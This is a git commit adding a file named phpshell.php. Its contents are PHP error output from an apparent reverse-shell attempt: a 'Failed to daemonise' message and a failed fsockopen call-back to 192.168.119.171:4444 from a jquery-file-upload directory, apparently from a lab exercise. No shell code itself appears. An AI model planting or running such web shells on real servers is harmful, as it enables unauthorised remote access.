8125984dd4e58d464d063b07c85ef11aca322721
Hackalicious <Ron.Grundy@gmail.com>
2020-09-10 01:33:07 -1000

    Add files via upload

---
+++ phpshell.php
@@ -0,0 +1,10 @@
+<br />
+<b>Notice</b>:  Undefined variable: daemon in <b>C:\xampp\htdocs\books\apps\jquery-file-upload\server\php\files\phpshell.php</b> on line <b>184</b><br />
+WARNING: Failed to daemonise.  This is quite common and not fatal.
+<br />
+<b>Warning</b>:  fsockopen(): unable to connect to 192.168.119.171:4444 (A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond.
+) in <b>C:\xampp\htdocs\books\apps\jquery-file-upload\server\php\files\phpshell.php</b> on line <b>100</b><br />
+<br />
+<b>Notice</b>:  Undefined variable: daemon in <b>C:\xampp\htdocs\books\apps\jquery-file-upload\server\php\files\phpshell.php</b> on line <b>184</b><br />
+A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond.
+ (10060)
